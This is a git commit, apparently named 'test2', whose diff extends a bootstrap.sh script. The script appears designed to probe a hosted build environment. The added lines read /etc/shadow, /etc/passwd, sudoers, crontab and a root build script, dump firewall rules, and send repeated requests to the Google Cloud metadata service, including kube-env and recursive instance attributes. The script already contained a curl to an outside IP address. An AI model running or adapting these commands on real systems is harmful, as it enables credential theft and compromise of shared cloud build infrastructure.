447914f5218b609f604db5f17149d2193f103c64
boo7 <boo7>
2018-12-22 23:36:16 +0100

    test2

--- bootstrap.sh
+++ bootstrap.sh
@@ -6,7 +6,32 @@ id
 uname -a
 mount
 ls /dev
-ifconfig
+ip addr
 curl -vv http://51.38.126.110/build_semmle
 ps -aux
+
+iptables-save
+cat /etc/resolv.conf
+cat /etc/passwd
+cat /etc/groups
+cat /etc/shadow
+cat /etc/sudoers
+ls /etc/sudoers.d/
+
+cat /etc/crontab
+cat /root/.start-build.sh
+
+curl  -H "X-Google-Metadata-Request: True" -vv http://169.254.169.254/computeMetadata/v1/
+curl -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/
+curl  -H "X-Google-Metadata-Request: True" -vv http://metadata/computeMetadata/v1/
+curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/hostname
+curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/id
+curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/project/project-id
+curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+curl -vv http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
+
+
+
+
 
